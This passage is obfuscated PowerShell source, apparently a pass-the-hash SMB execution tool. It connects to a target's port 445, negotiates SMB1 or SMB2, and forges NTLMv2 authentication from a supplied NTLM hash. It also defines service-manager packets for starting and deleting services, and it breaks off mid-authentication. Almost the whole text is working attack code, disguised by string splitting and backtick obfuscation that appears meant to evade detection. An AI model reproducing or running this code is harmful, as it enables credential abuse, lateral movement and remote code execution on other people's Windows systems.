    ${Pac`KE`T`_scMs`TAr`TServIC`Ew}.("{0}{1}"-f'A','dd').Invoke(("{2}{6}{5}{7}{4}{3}{1}{0}" -f'known','W_Un','S','ce','rvi','rtS','CMSta','e'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return ${paCKe`T`_sc`MSTAr`TS`ERvic`ew}
}

function Ge`T-PaCK`etSCmDEL`E`TESERV`Ic`EW()
{
    param([Byte[]]${P`A`CkET_CONTE`Xt_`h`AnD`LE})

    ${pAc`K`Et_sC`mDeLEte`seR`VI`Cew} = &("{2}{1}{0}" -f'ct','Obje','New-') ("{3}{11}{0}{13}{6}{12}{8}{5}{2}{7}{10}{4}{1}{9}"-f'.C','ictionar','c','Syst','redD','pe','lecti','ial','S','y','ized.Orde','em','ons.','ol')
    ${P`AckEt_Sc`mDEl`e`T`esErV`iCEw}.("{1}{0}" -f 'd','Ad').Invoke(("{7}{8}{0}{5}{4}{2}{3}{6}{1}"-f'ServiceW','Handle','n','t','o','_C','ext','SCMDele','te'),${pA`ck`e`T_Co`NTE`XT_hAn`dLE})

    return ${P`AckET_scmD`ElETeS`Er`V`I`c`ew}
}

function gET-`P`A`c`KeTsCmC`lOSe`s`ErV`ICehaNdle()
{
    param([Byte[]]${paCke`T_CoN`TEX`T`_H`AndlE})

    ${P`Ac`KEt`_scM_`Cl`oSE`s`erVIcEw} = &("{2}{0}{1}"-f'j','ect','New-Ob') ("{6}{9}{8}{3}{10}{1}{4}{2}{5}{7}{0}"-f'nary','al','zed.OrderedD','Collec','i','ic','Sys','tio','em.','t','tions.Speci')
    ${PacKe`T_`SCM`_`CLoSES`ErV`iceW}.("{0}{1}" -f'Ad','d').Invoke(("{3}{2}{0}{5}{1}{4}"-f'oseServiceW_Co','tHa','CMCl','S','ndle','ntex'),${P`Ac`k`Et_C`O`NTeXT`_handLe})

    return ${PaC`Ket`_SCm`_`cLo`SeSE`RV`IcEW}
}

function d`AtAL`ENGT`h2
{
    param ([Int]${L`En`gth`_stArt},[Byte[]]${St`Ri`N`G`_eXTraCt_Data})

    ${sTr`InG`_`LengTH} =   ${8`14}::"TOuIn`T`16"(${strINg`_E`xt`RACt`_`da`Ta}[${l`eNgTh_sT`ART}..(${leN`g`Th_`STArt} + 1)],0)

    return ${S`TRING_`lEnG`TH}
}

if(${hA`SH} -like "*:*")
{
    ${hA`sh} = ${HA`sH}.("{0}{2}{1}" -f 'SubSt','g','rin').Invoke((${Ha`sh}.("{0}{1}" -f'Inde','xOf').Invoke(":") + 1),32)
}

if(${dOM`Ain})
{
    ${outP`U`T`_USerN`Ame} = ${D`OMA`IN} + "\" + ${USe`RN`AMe}
}
else
{
    ${OuTP`U`T_u`sER`NAmE} = ${u`se`RnaMe}
}

${prO`CE`sS`_Id} =  (&("{0}{2}{1}"-f'VA','Le','RiaB') ('Rl'+'6ot') ).VaLUe::("{1}{3}{2}{4}{0}"-f'ess','GetC','r','u','rentProc').Invoke() | &("{2}{1}{3}{0}"-f'ct','bj','Select-O','e') -expand ('id')
${P`ROc`eSs_iD} =   ${8`14}::"To`STri`NG"( ${8`14}::("{1}{0}" -f's','GetByte').Invoke(${pR`o`CE`ss_iD}))
${Pr`ocesS`_id} = ${P`RocE`Ss_id} -replace ("{1}{0}" -f'00-00','-'),""
[Byte[]]${pr`oce`Ss`_iD_ByTeS} = ${Pr`OCE`Ss_`iD}.("{1}{0}" -f'lit','Sp').Invoke("-") | &("{2}{3}{1}{0}"-f 'ject','ch-Ob','F','orEa'){[Char]  ${x0g`Y`26}::("{2}{1}{0}" -f'nt16','I','To').Invoke(${_},16)}
${sMb`_`cLieNT} = &("{2}{1}{0}"-f'ect','-Obj','New') ("{2}{1}{3}{5}{4}{0}"-f'ent','ys','S','tem.','.TCPCli','Net.Sockets')
${SMB`_`clIenT}."CL`ieNT"."R`ECe`IVetIMeOUT" = 60000

try
{
    ${SMB`_`CLiE`Nt}.("{1}{0}" -f't','Connec').Invoke(${Ta`RG`Et},"445")
}
catch
{
    &("{3}{2}{0}{1}" -f 'u','t','e-Outp','Writ') ("$Target "+'di'+'d '+'not'+' '+'resp'+'ond')
}

if(${SmB`_C`lIeNT}."coN`Ne`ctED")
{
    ${SM`B_cLIEnt_`STRe`AM} = ${sMB_`cLi`eNT}.("{1}{0}{2}" -f 'etStrea','G','m').Invoke()
    ${s`MB_C`lIEn`T_r`eC`Ei`Ve} = &("{1}{2}{0}" -f 'Object','New','-') ("{0}{4}{2}{3}{1}"-f 'System',']','By','te[','.') 1024
    ${s`Mb_cLIE`Nt`_STage} = ("{1}{2}{0}"-f'B','Neg','otiateSM')

    while(${Sm`B`_Cl`ieNt_sT`AGE} -ne ("{1}{0}"-f'xit','e'))
    {
        
        switch (${Sm`B_CLi`E`Nt_`stAGe})
        {

            ("{1}{2}{0}" -f'eSMB','Negot','iat')
            {          
                ${paCKEt_`SM`B_HEA`der} = &("{3}{1}{2}{0}{4}" -f 'SMBHeade','-','Packet','Get','r') 0x72 0x18 0x01,0x48 0xff,0xff ${p`ROc`ess`_Id_`BY`TEs} 0x00,0x00       
                ${PA`Ck`E`T_sMb_DaTA} = &("{4}{2}{8}{6}{0}{7}{5}{9}{1}{3}" -f'tSM','otocolReq','-Pa','uest','Get','gotia','ke','BNe','c','tePr') ${SMb_`V`ER`sIon}
                ${S`M`B_`HeaDer} = &("{7}{1}{9}{4}{5}{8}{6}{3}{2}{0}" -f'ary','onvertF','on','i','ketO','rder','t','C','edDic','rom-Pac') ${PAck`Et_smB`_hE`Ad`eR}
                ${Sm`B_DA`TA} = &("{6}{1}{0}{3}{7}{5}{4}{2}"-f'From-','rt','ary','Packet','n','dDictio','Conve','Ordere') ${PACK`Et`_SMB`_`dAta}
                ${pa`C`keT_Netb`Ios`_SeSsioN_SEr`VicE} = &("{6}{1}{2}{7}{0}{5}{3}{4}"-f 'OSSessionS','et','-Packet','rvic','e','e','G','NetBI') ${smB_`HE`AD`ER}."lE`NgtH" ${smB`_DA`TA}."L`eNGTh"
                ${N`E`Tbio`s_seSsioN`_sERVi`cE} = &("{5}{4}{9}{2}{6}{8}{7}{3}{0}{1}" -f 'tiona','ry','ert','c','on','C','From-PacketOrde','edDi','r','v') ${PAC`Ke`T_N`eTBIos_SE`S`sIo`N_`S`erVice}
                ${smB_cl`IEN`T_sE`ND} = ${netb`IO`s_s`e`ssION_`s`erV`ICE} + ${s`mB_`HEaDER} + ${sM`B_DA`Ta}
                ${S`Mb_c`lIENt_str`EAm}.("{0}{1}"-f'Writ','e').Invoke(${sM`B_cLIe`NT`_s`ENd},0,${sMB_`clIeNT_`s`e`Nd}."L`EnGTh") > ${nu`Ll}
                ${s`M`B_C`lIEnT_sTRE`Am}.("{0}{1}" -f'F','lush').Invoke()    
                ${sm`B_`CliEn`T_`STre`Am}.("{0}{1}" -f 'Re','ad').Invoke(${Sm`B`_clIeN`T_recEI`Ve},0,${S`m`B`_CLIE`NT_RECEIvE}."L`e`NgtH") > ${N`ULL}

                if( (  &("{1}{2}{0}"-f 'iABLE','V','ar')  ("8"+"14")).VaLuE::"To`S`TRIng"(${S`mB_CLieNT_ReCE`i`Ve}[4..7]) -eq ("{1}{0}{2}"-f'f-','f','53-4d-42'))
                {
                    ${S`m`B`_VErSION} = ("{1}{0}"-f'1','SMB')
                    ${SMB_C`LIent_S`T`AGE} = ("{3}{0}{2}{1}" -f'SSPNe','te','gotia','NTLM')

                    if( ${8`14}::"T`oStRI`Ng"(${Smb`_`cL`iE`Nt_ReceiVE}[39]) -eq '0f')
                    {
                        &("{3}{0}{2}{1}"-f 'ite-','e','Verbos','Wr') ("{1}{0}{2}{3}" -f ' signin','SMB','g is e','nabled')
                        ${s`mB_SIGN`Ing} = ${T`RuE}
                        ${sMB_sESsIOn`_k`Ey`_lEN`GTh} = 0x00,0x00
                        ${sMb_NE`g`oTiATe`_F`lA`GS} = 0x15,0x82,0x08,0xa0
                    }
                    else
                    {
                        ${SMb_`s`iG`NinG} = ${FAl`SE}
                        ${smb_sE`S`s`Ion_`Ke`y`_LenGTH} = 0x00,0x00
                        ${sM`B_neg`ot`Ia`TE_fLags} = 0x05,0x82,0x08,0xa0
                    }

                }
                else
                {
                    ${Smb_`Clien`T_s`T`A`gE} = ("{4}{0}{1}{3}{2}"-f 'egoti','ate','B2','SM','N')

                    if( (&("{0}{1}"-f 'Di','r')  ('V'+'A'+'RiABLe:814')  ).vaLUE::"TOStR`I`Ng"(${S`mb_`cL`iEnt_`RECeiVE}[70]) -eq '03')
                    {
                        &("{1}{0}{2}"-f'-','Write','Verbose') ("{1}{4}{2}{0}{3}" -f'ni','SMB ','ig','ng is enabled','s')
                        ${smB_`s`I`gNiNg} = ${t`RuE}
                        ${SMb_`SEs`sIo`N_Ke`Y_Le`N`GtH} = 0x00,0x00
                        ${sM`B`_N`eGOTI`AtE_`FL`Ags} = 0x15,0x82,0x08,0xa0
                    }
                    else
                    {
                        ${S`MB`_SigNiNG} = ${F`A`lSE}
                        ${smB_SE`Ss`IO`N_Key`_LEnGTh} = 0x00,0x00
                        ${sMB`_nEgotIa`T`e_fLaGs} = 0x05,0x80,0x08,0xa0
                    }

                }

            }

            ("{2}{0}{1}"-f 'otia','teSMB2','Neg')
            {
                ${Sm`B2_tR`EE_Id} = 0x00,0x00,0x00,0x00
                ${SmB_`se`SSI`ON_Id} = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                ${SMb2`_me`S`Sage_Id} = 1
                ${Pa`CkeT_SM`B`2_HEAdER} = &("{5}{3}{1}{4}{0}{2}"-f'e','SM','r','cket','B2Head','Get-Pa') 0x00,0x00 ${sm`B2_mE`sS`AGe_`ID} ${SmB2_T`Ree`_`iD} ${Smb_`SESsio`N`_id}  
                ${pAC`kEt`_SMb2`_DAtA} = &("{1}{0}{2}{6}{5}{4}{3}" -f't-PacketS','Ge','MB2N','ocolRequest','Prot','ate','egoti')
                ${sMb`2`_HeAdER} = &("{1}{4}{3}{0}{5}{6}{2}" -f'ed','ConvertFrom-Pa','ary','der','cketOr','Dicti','on') ${Packet_`smB`2`_`heaD`ER}
                ${S`MB2_d`Ata} = &("{7}{3}{5}{6}{2}{1}{4}{0}"-f 'nary','er','rom-PacketOrd','on','edDictio','vert','F','C') ${pAck`eT_SM`B2_`DA`Ta}
                ${p`ACKET`_n`ETbI`os_`sES`SIoN_`S`eRvICE} = &("{4}{0}{7}{6}{3}{1}{8}{5}{2}" -f 'et-Pac','IOSSessi','Service','tB','G','n','etNe','k','o') ${smb2_HEa`D`Er}."L`EnG`TH" ${s`mB2_d`ATA}."L`eNgTh"
                ${NETbios_seSSiOn_s`E`R`V`ice} = &("{7}{1}{4}{8}{9}{3}{0}{6}{2}{5}" -f'et','r','ic','ack','tF','tionary','OrderedD','Conve','rom-','P') ${P`AcK`E`T_NETbiO`s_S`eSs`I`oN_serVI`ce}
                ${sMB_`cL`I`enT_sEND} = ${net`B`Ios_S`E`s`sIOn_SERVI`cE} + ${S`mB2`_hea`DER} + ${sMB2_D`A`TA}
                ${Sm`B_C`LIe`NT_S`TRE`Am}.("{0}{1}"-f'Writ','e').Invoke(${sM`B_`C`lIEN`T_seNd},0,${sMb_`C`li`E`NT_SEnd}."l`en`gTH") > ${nu`LL}
                ${SMb_cl`i`E`NT_StrEAm}.("{1}{0}"-f'lush','F').Invoke()    
                ${SMB_c`L`ie`Nt_ST`REAm}.("{0}{1}" -f 'Rea','d').Invoke(${Sm`B_`cLI`EN`T_rEcE`Ive},0,${Sm`B_Cl`i`eN`T_re`ceivE}."leN`G`TH") > ${nu`Ll}
                ${SMB_CLIEn`T_`ST`Age} = ("{3}{0}{4}{1}{2}"-f 'SPNe','ot','iate','NTLMS','g')
            }
                
            ("{1}{0}{3}{2}" -f 'TLM','N','ate','SSPNegoti')
            { 
                if(${SMb_v`e`R`sion} -eq ("{0}{1}"-f 'SM','B1'))
                {
                    ${P`A`CK`Et_`SMB_`hEadER} = &("{3}{4}{2}{1}{0}"-f'SMBHeader','et','k','Get-','Pac') 0x73 0x18 0x07,0xc8 0xff,0xff ${p`R`OcES`s_id_BY`TES} 0x00,0x00

                    if(${S`MB`_s`iGNING})
                    {
                        ${P`Ac`ket`_SMb_header}[("{0}{3}{1}{2}"-f'S','Heade','r_Flags2','MB')] = 0x05,0x48
                    }

                    ${pA`CkEt_n`T`lm`ssp_nEgOtIATE} = &("{5}{0}{2}{1}{3}{4}"-f 't','acketNTLMSSP','-P','Negotiat','e','Ge') ${smB_n`EGO`T`IaTE`_fLA`Gs}
                    ${SMB_`H`EA`DeR} = &("{8}{0}{2}{5}{4}{10}{7}{6}{1}{3}{9}" -f'n','edDict','v','ion','rt','e','cketOrder','-Pa','Co','ary','From') ${PAcKet_S`mB`_`hE`ADeR}
                    ${n`TLM`SsP`_Ne`GotIATe} = &("{3}{0}{7}{6}{2}{5}{1}{4}"-f 'n','na','etOrderedDi','Co','ry','ctio','k','vertFrom-Pac') ${p`A`c`KE`T_NtlMsSP`_n`egotia`Te}       
                    ${PaC`K`Et`_Sm`B_DATa} = &("{6}{2}{8}{1}{9}{3}{4}{0}{7}{5}"-f 'q','upA','ess','dXR','e','st','Get-PacketSMBS','ue','ionSet','n') ${NtlmSS`p`_`NEGotIAtE}
                    ${SMb_D`A`TA} = &("{8}{9}{10}{6}{5}{0}{1}{3}{7}{4}{2}" -f 'dD','i','ry','c','na','etOrdere','From-Pack','tio','Con','v','ert') ${PaCK`E`T_sMb`_`DATa}
                    ${pa`CK`Et`_neTbI`os_sESsION_SERv`ICe} = &("{3}{8}{2}{0}{5}{1}{6}{7}{4}"-f 'essionSe','v','NetBIOSS','G','e','r','i','c','et-Packet') ${sMb_`hEAD`ER}."LEnG`TH" ${S`M`B`_DaTA}."lE`NGTh"
                    ${NET`B`ios`_sesS`ion`_sErvice} = &("{9}{5}{8}{6}{7}{3}{2}{0}{1}{4}" -f't','io','c','rderedDi','nary','onvertF','ket','O','rom-Pac','C') ${PAck`eT_NetBi`O`s`_se`SSiON`_`serVicE}
                    ${S`MB_cLiEnt`_sEnd} = ${N`E`T`BIos_Se`ssiOn_`sEr`V`Ice} + ${S`Mb_h`EA`DEr} + ${sM`B`_dAtA}
                }
                else
                {
                    ${SmB2`_`m`essAgE_ID} += 1
                    ${pA`C`k`Et_`Smb2_hEadEr} = &("{1}{3}{4}{5}{2}{0}"-f 'eader','G','2H','et-Packet','S','MB') 0x01,0x00 ${sM`B2_M`E`S`sAgE_iD} ${SmB2`_T`Ree`_ID} ${sMb_S`e`Ss`IoN_id}
                    ${p`ACkE`T_nT`l`mssp_NeG`OTiATe} = &("{2}{6}{0}{5}{1}{3}{4}"-f'-PacketNTLMSS','ot','Ge','i','ate','PNeg','t') ${SMB_`N`EGoTI`Ate`_f`L`Ags}
                    ${SMB`2`_H`EAder} = &("{6}{5}{8}{0}{4}{2}{7}{1}{3}" -f'rom-PacketOrde','on','edDict','ary','r','onve','C','i','rtF') ${P`ACkET_Sm`B2_He`ADer}
                    ${NtL`m`S`Sp_nEGotiAtE} = &("{1}{9}{6}{3}{10}{5}{8}{0}{4}{2}{7}"-f 're','ConvertFrom-','i','O','dD','d','acket','ctionary','e','P','r') ${paCKe`T_nTlm`SsP`_`Nego`Ti`AtE}       
                    ${pAc`K`et`_s`mB2_`daTa} = &("{0}{3}{1}{8}{4}{7}{6}{2}{5}" -f'G','ketSMB','eques','et-Pac','n','t','pR','Setu','2Sessio') ${NT`lmSSp_`NeGOTi`ATE}
                    ${SM`B2_Da`Ta} = &("{5}{2}{4}{0}{6}{1}{3}{7}" -f'redDi','tio','From-Pa','nar','cketOrde','Convert','c','y') ${paC`KE`T`_sm`B2_dATa}
                    ${PAcKET_`NEt`BI`oS`_`sE`s`sio`N_serv`ICE} = &("{2}{1}{5}{7}{3}{0}{6}{4}" -f'ion','-PacketNe','Get','Sess','e','tB','Servic','IOS') ${s`mb2`_HeaDER}."lE`NGTh" ${s`MB2_d`ATa}."lenG`TH"
                    ${neTb`IoS_SesS`iOn`_`SeRV`Ice} = &("{5}{1}{0}{9}{7}{8}{3}{6}{2}{4}" -f't','r','Diction','rder','ary','Conve','ed','om-','PacketO','Fr') ${P`A`C`keT_`NeTBIos`_S`ESsi`oN_Ser`V`ICe}
                    ${smB_clIE`NT_`SEnD} = ${ne`TBI`os_SESsIo`N`_SerV`ICE} + ${SmB2`_`HEadER} + ${sMB`2_dA`TA}
                }

                ${s`mB_cL`Ien`T_sT`Re`Am}.("{0}{1}"-f'W','rite').Invoke(${sMb`_Cli`E`NT_S`END},0,${smb_C`LiE`NT_`SeND}."lEn`gTh") > ${N`ULL}
                ${SMB_C`LIe`Nt_S`TrEAM}.("{0}{1}"-f 'Flu','sh').Invoke()    
                ${s`MB_C`LIent_st`ReaM}.("{0}{1}" -f 'Rea','d').Invoke(${s`mb`_cLiEn`T_Re`cEI`VE},0,${sMB`_C`LiE`Nt_REC`EI`VE}."LEN`G`Th") > ${nU`ll}
                ${sMB`_cL`I`ENT_St`AGe} = ("{0}{1}"-f 'ex','it')
            }
            
        }

    }

    ${smB_ntl`m`SSp} =  (&("{3}{2}{0}{1}" -f'B','le','T-varIA','ge')  814 -VALUEo)::("{2}{0}{1}" -f 'n','g','ToStri').Invoke(${Sm`B_CLIENT`_Rec`e`IVE})
    ${s`MB_ntLm`S`SP} = ${SmB_`NTlM`Ssp} -replace "-",""
    ${Smb_ntLMSS`P_I`N`dEX} = ${SM`B_N`Tlm`Ssp}.("{1}{0}"-f 'f','IndexO').Invoke(("{4}{0}{1}{2}{3}" -f '44C','4D','5','3535000','4E5'))
    ${sm`B_n`TLmS`sP_BYtES_in`d`eX} = ${sMb_ntLM`s`sp`_IN`dex} / 2
    ${s`mB`_DO`MaiN_`L`ENgTh} = &("{1}{0}{2}"-f 'taL','Da','ength2') (${Smb_NTL`mSsp_bYt`Es`_IN`DEX} + 12) ${SMb_clIEn`T_Re`CE`iVe}
    ${SMb_ta`RGEt`_L`e`Ng`Th} = &("{2}{1}{0}" -f'gth2','en','DataL') (${smb_`N`T`lM`sSP_BYtes`_in`D`eX} + 40) ${smb`_cli`EN`T`_re`Cei`Ve}
    ${Sm`B`_s`essioN_Id} = ${sm`B`_`CL`ieNt_r`e`CEIVe}[44..51]
    ${s`MB`_NTlM_ChA`l`le`NGe} = ${Smb_cLIe`N`T_ReC`ei`VE}[(${s`MB`_`NtL`M`SSP_by`TeS_I`NDex} + 24)..(${s`mB_NtLM`s`s`P_Byt`e`S_InDex} + 31)]
    ${SmB_TARGEt_`d`EtA`ILS} = ${s`Mb_c`lI`ent_rEceI`Ve}[(${SM`B_NtL`MSSp_bY`Te`S_`I`N`DEx} + 56 + ${SMb`_d`oM`Ai`N_L`EngTh})..(${SMb_NtLmSsp_B`y`T`ES_`indEX} + 55 + ${S`Mb_domA`iN_`L`eNGth} + ${S`M`B_tArgEt_lEN`GTh})]
    ${sMb_tA`RG`et_Tim`E_b`YTES} = ${SMb_TA`Rg`eT_`DeTAilS}[(${Sm`B`_TAR`gET_detA`ILS}."LEN`gtH" - 12)..(${SMB_TaRGET_`d`e`TAILS}."lE`Ng`Th" - 5)]
    ${nt`lm_`hAsh_`BY`Tes} = (&{for (${I} = 0;${i} -lt ${hA`sh}."l`ENgth";${I} += 2){${HA`Sh}.("{2}{0}{1}" -f 'b','String','Su').Invoke(${I},2)}}) -join "-"
    ${nt`LM_`h`Ash_b`YtES} = ${NT`lm_hAsh`_Byt`eS}.("{0}{1}" -f 'S','plit').Invoke("-") | &("{0}{3}{1}{2}"-f'For','bj','ect','Each-O'){[Char]  ( &('gI') ("{3}{2}{1}{0}{4}"-f'g','0',':X','VArIAblE','y26') ).VALue::("{0}{1}{2}" -f'T','oInt1','6').Invoke(${_},16)}
    ${au`T`h_`H`ostNaME} = (&("{2}{1}{0}"-f'ldItem','Chi','Get-') -path ("{3}{0}{1}{2}{4}"-f'v:co','mp','uternam','en','e'))."VaL`Ue"
    ${au`TH_`HOsTNaM`e_bYTES} =   ( &("{2}{0}{3}{1}"-f 'V','abLe','GeT-','arI') ("S"+"5u2")).vAluE::"Un`iCodE".("{1}{2}{0}"-f 's','GetB','yte').Invoke(${au`T`H_HO`stnAmE})
    ${auT`H_`domaiN_B`y`T`eS} =   (&("{2}{1}{0}" -f 'e','RiAbl','geT-vA')  ("{0}{1}" -f 'S5','U2')  ).vaLuE::"u`NicO`dE".("{1}{2}{0}"-f 's','Ge','tByte').Invoke(${D`O`main})
    ${A`U`T`h_uSERNAmE_BY`T`eS} =   ${S`5u2}::"UN`ICOde".("{0}{2}{1}" -f'Ge','s','tByte').Invoke(${UsERN`AmE})
    ${AUt`H_d`o`MaIN_LeNgtH} =  (  &("{2}{1}{0}" -f 'E','RiAbL','Va')  814).VaLuE::("{2}{0}{1}"-f 't','es','GetBy').Invoke(${aU`T`h_`D`OmaIn_B`YTEs}."l`E`Ngth")
    ${AUtH_D`O`MAi`N`_LE`NgTh} = ${AuTH_dO`maIN`_`LEn`g`TH}[0,1]
    ${AUt`H_DoMA`I`N_leN`g`TH} =  ( &("{1}{0}{2}" -f 'Ri','va','ablE')  814  ).value::("{2}{1}{0}"-f'es','Byt','Get').Invoke(${AutH_dOm`AiN_B`Yt`ES}."LEN`gtH")
    ${a`UtH_d`o`m`AIn_`lENGtH} = ${aut`H_DO`Mai`N_lenG`TH}[0,1]
    ${A`UTh`_U`SerNA`me_LeNgTh} =   (  &("{1}{0}{2}"-f'iLdIt','ch','EM') ("vAriAB"+"l"+"e:814")  ).vALue::("{0}{1}{2}"-f'GetB','y','tes').Invoke(${auT`H_USerNa`ME_`B`Y`TEs}."le`NGth")
    ${AUtH`_u`SERnAME_`LE`NGth} = ${A`U`Th_USERNaMe_leN`g`TH}[0,1]
    ${aUth`_h`Os`TNAmE_LeNGTH} =   (  &('Gi') ('va'+'Ri'+'a'+'BLe:814')).VALuE::("{0}{1}{2}" -f'G','etByt','es').Invoke(${A`UTh_`H`os`TnAMe_BYTEs}."lEN`g`Th")
    ${a`UT`H_HOsTN`AM`E_LEN`gth} = ${Au`TH_`hOSt`N`AM`E`_lENgth}[0,1]
    ${A`Ut`h_DOMAIn_Of`Fs`et} = 0x40,0x00,0x00,0x00
    ${au`T`H_U`SerName_`of`FSEt} =   (  &("{1}{0}{2}" -f'-VaRIAb','Get','Le') ("81"+"4") -VAlU)::("{1}{0}" -f'etBytes','G').Invoke(${AUTH_`DO`mAIn`_`BYt`Es}."L`E`NgtH" + 64)
    ${AU`Th`_hostN`AME_offseT} =  (&("{2}{3}{1}{0}" -f 'aBLE','ri','GEt','-vA')  ('81'+'4')  -vaLUEoN )::("{1}{0}{2}"-f 'etB','G','ytes').Invoke(${A`Ut`h_do`ma`in_BYTEs}."l`EN`Gth" + ${autH`_u`S`E`RnA`ME_bYtes}."L`EnGth" + 64)
    ${auT`h_lm_OFFS`eT} =   (  &("{1}{0}{2}{3}" -f'H','GET-C','IlDiTe','m')  ('Va'+'RIAbL'+'e:814')).valUE::("{2}{0}{1}"-f'By','tes','Get').Invoke(${A`UtH_`DOm`AIN_by`Tes}."le`NG`Th" + ${auTH_`USER`NA`Me_b`Y`TEs}."Len`GtH" + ${A`UTH_`ho`STn`A`me_byteS}."LE`NGTh" + 64)
    ${auTh_N`T`Lm`_oF`FseT} =  ( &("{2}{0}{1}"-f'Ri','AbLe','Va') 814 -valUeo )::("{1}{0}{2}" -f 'yte','GetB','s').Invoke(${A`Uth`_DOmAi`N_`BYt`Es}."LE`Ng`TH" + ${aUTh_`US`eRNAmE_`B`ytES}."le`NgTH" + ${A`U`TH_hO`sT`NAme`_`BytES}."le`NGTH" + 88)
    ${H`M`Ac_`md5} = &("{2}{1}{0}" -f 'bject','O','New-') ("{1}{3}{7}{9}{0}{4}{2}{6}{8}{5}"-f'ryp','S','og','y','t','D5','ra','stem.Secu','phy.HMACM','rity.C')
    ${hm`AC_M`D5}."K`ey" = ${ntl`m`_has`H_bYt`ES}
    ${USEr`NAM`e_`And_`TarG`eT} = ${U`seR`NAme}.("{2}{1}{0}"-f 'r','Uppe','To').Invoke()
    ${usERnaME`_a`Nd`_taRg`et_`BYteS} =  ${S5`U2}::"uni`COde".("{1}{2}{0}" -f 'tes','Ge','tBy').Invoke(${use`Rn`AMe_and`_`TaR`get})
    ${uSERNA`Me_A`Nd_taRG`et_By`TeS} += ${AUt`h_doMAiN`_ByT`es}
    ${N`TlMv2`_`haSh} = ${HMa`c_M`d5}."cOMp`UT`EHash"(${U`Ser`NAMe_an`D`_taR`gE`T_By`Tes})
    ${cL`IEN`T_cHA`l`lenGe} = [String](1..8 | &("{3}{1}{2}{0}"-f'ect','Each-O','bj','For') {"{0:X2}" -f (&("{0}{2}{3}{1}" -f'Get-Ran','m','d','o') -Minimum 1 -Maximum 255)})
    ${Cl`IENT_Ch`AlLe`NGe_`BytES} = ${CLie`NT_chaLl`eN`Ge}.("{1}{0}" -f 'it','Spl').Invoke(" ") | &("{2}{3}{1}{4}{0}"-f 't','ch-','Fo','rEa','Objec'){[Char] ( &("{1}{2}{0}"-f 'EM','Ge','t-It')  ("{3}{0}{2}{1}{4}"-f 'E:','0g','x','VarIAbl','Y26')).valUe::("{0}{2}{1}" -f'To','6','Int1').Invoke(${_},16)}

    ${secuRiT`y_BloB`_`BytEs} = 0x01,0x01,0x00,0x00,
                            0x00,0x00,0x00,0x00 +
                            ${smB_`TArGe`T_tImE_B`YTes} +
                            ${c`lIent`_CH`A`lLe`NGE_bYT`Es} +
                            0x00,0x00,0x00,0x00 +
                            ${S`mb_Ta`R`GE`T`_deTai`Ls} +
                            0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00

    ${S`eRve`R_CH`AL`l`enGe`_AN`d_`S`eCurITy_bLO`B`_b`YtEs} = ${SM`B_NtlM_`ChALL`eNge} + ${s`EC`URit`Y_`BLO`B_bY`TeS}
    ${HMAc`_M`d5}."k`EY" = ${NTLMv`2_`HAsh}
    ${n`TLM`V2_reS`POn`SE} = ${hMa`c`_Md5}."cOMp`U`TehAsH"(${s`ERVer_`CHal`lEngE_and_SEc`UritY_BLO`B_bYT`ES})

    if(${SMb`_s`iGn`INg})
    {
        ${Se`ssiON`_B`A`sE_K`EY} = ${h`ma`c_m`D5}."COMpuTE`h`AsH"(${nt`lmv2_rESp`o`Nse})
        ${sess`ION`_k`Ey} = ${sE`ssio`N`_`BASE_`KeY}
        ${hmA`c_`sha256} = &("{2}{1}{0}" -f'bject','w-O','Ne') ("{4}{8}{7}{11}{2}{10}{3}{1}{0}{6}{9}{5}" -f'hy.HM','grap','.C','ypto','System','6','AC','ur','.Sec','SHA25','r','ity')
        ${hMA`c_SH`A2`56}."K`eY" = ${SEss`iO`N_k`eY}
    }

    ${Ntlm`V2`_re`spONSe} = ${NtlMv`2`_r`Es`Ponse} + ${S`e`CuRI`TY_BlOB_b`yT`es}
    ${ntl`mv2`_rE`S`p`ONSE`_leNgtH} =   ( &("{2}{0}{1}"-f '-Va','RIABlE','gEt')  ('81'+'4') -VA )::("{1}{0}{2}" -f 'etBy','G','tes').Invoke(${NTl`mv2_`RE`SP`onSe}."L`eNGTH")
    ${ntLmV`2`_`RE`Sp`On`Se`_lEngTH} = ${ntLm`V2_RespOn`S`E_le`NgTH}[0,1]
    ${S`Mb_s`ESSi`On_key_O`Ff`SET} =   (&("{2}{1}{0}" -f'E','rIabl','va') ("8"+"14")).valUe::("{0}{1}{2}"-f'G','etByt','es').Invoke(${A`U`Th_DOmai`N`_`ByTEs}."le`NG`Th" + ${AUt`h_USe`R`NaME_byT`es}."L`enGtH" + ${A`UTh_`HOStNaMe_b`yTeS}."lenG`Th" + ${nt`lm`V2`_R`ESPonsE}."LE`NGTh" + 88)

    ${nt`LMSs`P_`RESpo`Nse} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                            0x03,0x00,0x00,0x00,
                            0x18,0x00,
                            0x18,0x00 +
                            ${aUtH`_`lm_`of`FSEt} +
                            ${ntL`Mv2_`R`Es`p`o`Nse_leNG`TH} +
                            ${NTLm`V2_r`esponS`E`_l`e`Ng`TH} +
                            ${a`Uth_`N`TLM_O`FfSET} +
                            ${a`UtH`_d`om`AiN_LEn`Gth} +
                            ${au`T`H_DO`MAIn_LE`N`gtH} +
                            ${AU`Th_Dom`A`IN`_`OFfsEt} +
                            ${AU`TH_U`S`eRna`M`e_length} +
                            ${au`T`h_USERNA`Me_lEN`GTh} +
                            ${Au`Th_U`sER`NAme_OF`FSet} +
                            ${aUTh_HOsT`N`AMe_`leng`TH} +
                            ${A`UTh_Hos`TnaM`E_`lEnGth} +
                            ${auT`h_hoSTNaM`E`_`OF`FSET} +
                            ${smb`_sEs`s`iOn_k`eY_L`ength} +
                            ${sM`B_`S`eSSION`_KEy_LENgtH} +
                            ${S`mb`_`sE`Ssi`On_Key_OfFsEt} +
                            ${sm`B_N`EgOT`iate`_`F`LaGS} +
                            ${auth_dOmA`iN_B`y`TEs} +
                            ${AUth_uSE`RNA`ME_by`TeS} +
                            ${aUTH`_`h`OSTnAm`e_bYTEs} +
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                            ${n`TLMV2_rEs`pON`Se}

    if(${Smb_ver`sI`On} -eq ("{0}{1}" -f 'S','MB1'))
    {
        ${sMB_u`SER`_iD} = ${s`mb`_CLIEnT`_`RECeI`VE}[32,33]
